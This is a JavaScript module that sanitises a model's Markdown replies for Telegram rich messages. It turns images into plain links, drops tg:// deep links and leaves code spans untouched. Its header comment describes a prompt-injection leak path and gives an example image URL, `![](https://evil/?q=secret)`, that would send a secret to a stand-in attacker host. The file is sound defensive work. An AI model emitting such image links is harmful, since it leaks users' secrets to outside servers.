// SPDX-License-Identifier: AGPL-3.0-only

/**
 * Turning a model's Markdown into something safe to hand to Telegram Rich Messages.
 *
 * `rich_message.markdown` renders real Markdown — bold, lists, code, tables — up to 32768
 * characters, which is the whole reason #3 exists: a chat window that only ever showed plain
 * text was never what the model was writing. But Markdown images are a fetch a model can
 * trigger: `![](https://evil/?q=secret)` makes *Telegram's servers* request that URL, and a
 * model that has read something it should not have — a prompt injection sitting in a file, a
 * page, a tool result — can turn that read into an outbound request with the secret in the
 * query string, before a person ever sees the message. There is no way to render an image
 * without fetching it, so the fix is not to render it: every image becomes a plain link, which
 * a person can choose to open and a server cannot follow on its own.
 *
 * `tg://` links get the harder treatment — dropped rather than downgraded — because they are
 * not a fetch, they are a deep link into the Telegram client itself, and a model has no
 * business handing the app a command to run.
 *
 * None of this touches a code block or an inline code span. A model showing `![alt](url)` as
 * an *example* of Markdown syntax, inside three backticks, is not making a request — it is
 * quoting one — and rewriting it would be teaching the sanitiser to lie about what the model
 * actually said.
 */

/** Telegram's own cap on `rich_message.markdown`. */
export const RICH_LIMIT = 32768

/** The same sentence `marked()` already says over plain text, said once more for rich replies. */
export const MARKER = "— via Telegram. This conversation goes through Telegram's servers."

/** A fenced block (```…```, across lines) or an inline span (`…`) — neither gets rewritten. */
const CODE_RE = /```[\s\S]*?```|`[^`\n]*`/g

/** An (optional `!`) Markdown link, its label, and everything between the parentheses. */
const LINK_RE = /(!?)\[([^\]]*)\]\(([^)]*)\)/g

/**
 * Split `(url "title")` into the two halves. A title is optional; a url is whatever is left.
 *
 * **And a destination may be wrapped in angle brackets** — `[tap](<tg://resolve?domain=x>)` is
 * CommonMark's own way of writing a link target that contains spaces, and every renderer
 * unwraps it. This did not, so the `tg://` test was run against `<tg://…>`, did not match, and
 * the one kind of link that is supposed to be impossible to send went through untouched. One
 * pair, stripped before anything is asked about what the url points at.
 */
function urlOf(inside) {
  const trimmed = inside.trim()
  const titled = /^(\S*)\s+"([^"]*)"$/.exec(trimmed)
  const url = titled ? titled[1] : trimmed
  return url.startsWith('<') && url.endsWith('>') ? url.slice(1, -1).trim() : url
}

/** The rewrite, applied to text known to hold no code — the one place link syntax is real. */
function rewriteLinks(text) {
  const rewritten = text.replace(LINK_RE, (whole, bang, label, inside) => {
    const url = urlOf(inside)
    const isTelegramDeepLink = /^tg:\/\//i.test(url)
    if (bang === '!') {
      // An image. Fetching it is the leak, so it never stays an image — a plain link a person
      // has to choose to open, or nothing at all when even that link is a deep one.
      if (isTelegramDeepLink) return ''
      return `[${label || url}](${url})`
    }
    // An ordinary link. Left alone, unless it points into the app rather than the web.
    return isTelegramDeepLink ? label : whole
  })
  // **Every `![` the pattern above could not read**, disarmed the blunt way. Markdown allows
  // brackets inside an image's alt text and a reference-style `![alt][ref]`, and neither is
  // shaped like `LINK_RE` — so an allowlist of what was rewritten would be a list of the ways
  // past it. Without the `!` there is no image, whatever the rest turns out to be.
  return rewritten.replaceAll('![', '[')
}

/** Model Markdown, made safe for `rich_message.markdown`. */
export function forRich(markdown) {
  const text = String(markdown ?? '')
  let out = ''
  let last = 0
  CODE_RE.lastIndex = 0
  let match = CODE_RE.exec(text)
  while (match) {
    out += rewriteLinks(text.slice(last, match.index))
    out += match[0]
    last = CODE_RE.lastIndex
    match = CODE_RE.exec(text)
  }
  out += rewriteLinks(text.slice(last))
  return out
}

/**
 * The privacy line, in whichever alphabet the message is being sent in — italic Markdown for
 * a rich message, plain text for the fallback that has no Markdown to render it with.
 */
export function withMarker(text, rich) {
  return rich ? `${text}\n\n_${MARKER}_` : `${text}\n\n${MARKER}`
}
